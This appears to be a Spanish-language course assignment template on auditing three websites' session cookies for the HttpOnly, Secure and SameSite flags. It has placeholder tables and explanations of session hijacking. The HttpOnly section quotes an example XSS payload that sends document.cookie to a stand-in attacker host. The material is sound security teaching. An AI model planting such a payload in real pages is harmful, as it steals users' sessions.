# Objetivo 1: Auditoría de Cookies y Banderas de Seguridad

## Descripción

Analicé las cookies de sesión de tres sitios web públicos con el inspector del navegador, para ver si usan bien las banderas de seguridad `HttpOnly`, `Secure` y `SameSite`.

Para revisarlas hay que iniciar sesión en el sitio, abrir las herramientas de desarrollador con F12 y entrar a Application > Storage > Cookies (en Firefox, Storage > Cookies). Ahí cada cookie aparece con las columnas `HttpOnly`, `Secure` y `SameSite`, que indican qué banderas tiene.

## Desarrollo

### Sitio 1: [nombre del sitio]

| Cookie | ¿Es de sesión? | HttpOnly | Secure | SameSite | Expira |
| --- | --- | --- | --- | --- | --- |
| [nombre] | [Sí / No] | [✅ / ❌] | [✅ / ❌] | [Strict / Lax / None / vacío] | [fecha o "Session"] |

![Cookies de [sitio 1]](./evidencia_sitio_1.png)

**Observaciones:** [¿La cookie de sesión tiene las tres banderas? ¿Falta alguna?]

### Sitio 2: [nombre del sitio]

| Cookie | ¿Es de sesión? | HttpOnly | Secure | SameSite | Expira |
| --- | --- | --- | --- | --- | --- |
| [nombre] | [Sí / No] | [✅ / ❌] | [✅ / ❌] | [Strict / Lax / None / vacío] | [fecha o "Session"] |

![Cookies de [sitio 2]](./evidencia_sitio_2.png)

**Observaciones:** [...]

### Sitio 3: [nombre del sitio]

| Cookie | ¿Es de sesión? | HttpOnly | Secure | SameSite | Expira |
| --- | --- | --- | --- | --- | --- |
| [nombre] | [Sí / No] | [✅ / ❌] | [✅ / ❌] | [Strict / Lax / None / vacío] | [fecha o "Session"] |

![Cookies de [sitio 3]](./evidencia_sitio_3.png)

**Observaciones:** [...]

> No publicar el valor de las cookies de sesión: con ese valor cualquiera puede entrar a la cuenta. En las capturas, tapar la columna *Value*.

### ¿Qué protege la bandera HttpOnly?

`HttpOnly` hace que el JavaScript de la página no pueda leer la cookie, o sea que no aparece en `document.cookie`. El navegador la sigue mandando al servidor en cada petición, así que la sesión funciona igual que siempre.

Lo que protege es que roben la cookie de sesión con un XSS. Si un atacante consigue meter un script en la página, sin `HttpOnly` le alcanza con algo como `fetch("https://atacante.com/?c=" + document.cookie)` para quedarse con la cookie y entrar a la cuenta desde su propia máquina. Con `HttpOnly` activo, el script no la puede leer.

Esto no soluciona el XSS: mientras la página esté abierta, el script igual puede hacer cosas en nombre del usuario. Lo que evita es que la sesión se pueda robar para usarla en otro lado.

### ¿Qué riesgo corre el usuario si la cookie de sesión no tiene Secure?

`Secure` hace que el navegador mande la cookie solo por HTTPS. Si no está, el navegador también la manda en cualquier petición `http://` al mismo dominio, y ahí viaja sin cifrar.

El riesgo es que le secuestren la sesión. Alguien que esté en la misma red, por ejemplo un wifi público, puede ver ese tráfico, copiar la cookie y entrar a la cuenta de la víctima sin saber la contraseña. Con que el usuario entre una sola vez a un link `http://` del sitio, o que el atacante lo fuerce a hacerlo, alcanza para que la cookie se filtre. Es el mismo problema que vi con la falta de HSTS en el módulo anterior.

## Conclusiones

[Resumen de los tres sitios: cuáles protegen bien su cookie de sesión y cuáles no, y qué bandera faltaba.]
